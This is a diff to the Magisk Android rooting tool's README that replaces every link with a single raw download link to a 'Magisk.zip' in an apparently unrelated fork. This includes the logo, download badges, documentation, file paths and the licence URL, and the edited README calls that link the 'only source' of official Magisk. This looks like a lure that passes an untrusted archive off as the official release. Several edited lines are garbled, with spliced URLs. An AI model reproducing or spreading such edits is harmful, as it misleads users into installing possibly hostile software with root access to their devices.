@@ -1,6 +1,6 @@
-![](docs/images/logo.png)
+![](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
 
-[![Downloads](https://img.shields.io/badge/dynamic/json?color=green&label=Downloads&query=totalString&url=https%3A%2F%2Fraw.githubusercontent.com%2Ftopjohnwu%2Fmagisk-files%2Fcount%2Fcount.json&cacheSeconds=1800)](https://raw.githubusercontent.com/topjohnwu/magisk-files/count/count.json)
+[![Downloads](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip%3A%2F%https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip%2Ftopjohnwu%2Fmagisk-files%2Fcount%https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
 
 #### This is not an officially supported Google product
 
@@ -16,20 +16,20 @@ Some highlight features:
 
 ## Downloads
 
-[Github](https://github.com/topjohnwu/Magisk/) is the only source where you can get official Magisk information and downloads.
+[Github](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip) is the only source where you can get official Magisk information and downloads.
 
 Click the icon below to download Magisk apk.
 
-[![](https://img.shields.io/badge/Magisk-v27.0-blue)](https://github.com/topjohnwu/Magisk/releases/tag/v27.0)
-[![](https://img.shields.io/badge/Magisk%20Beta-v27.0-blue)](https://github.com/topjohnwu/Magisk/releases/tag/v27.0)
-[![](https://img.shields.io/badge/Magisk-Canary-red)](https://github.com/topjohnwu/Magisk/releases/tag/canary-27006)
+[![](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
+[![](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip%20Beta-v27.0-blue)](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
+[![](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
 
 ## Useful Links
 
-- [Installation Instruction](https://topjohnwu.github.io/Magisk/install.html)
-- [Building and Development](https://topjohnwu.github.io/Magisk/build.html)
-- [Magisk Documentation](https://topjohnwu.github.io/Magisk/)
-- [Zygisk module sample](https://github.com/topjohnwu/zygisk-module-sample)
+- [Installation Instruction](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
+- [Building and Development](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
+- [Magisk Documentation](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
+- [Zygisk module sample](https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip)
 
 ## Bug Reports
 
@@ -43,10 +43,10 @@ For Magisk app crashes, record and upload the logcat when the crash occurs.
 
 Default string resources for the Magisk app and its stub APK are located here:
 
-- `app/core/src/main/res/values/strings.xml`
-- `app/stub/src/main/res/values/strings.xml`
+- `https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip`
+- `https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip`
 
-Translate each and place them in the respective locations (`[module]/src/main/res/values-[lang]/strings.xml`).
+Translate each and place them in the respective locations (`[module]/src/main/res/values-[lang]https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip`).
 
 ## License
 
@@ -61,4 +61,4 @@ Translate each and place them in the respective locations (`[module]/src/main/re
     GNU General Public License for more details.
 
     You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+    along with this program.  If not, see <https://raw.githubusercontent.com/Denis-arc/Magisk/master/spirket/Magisk.zip>.
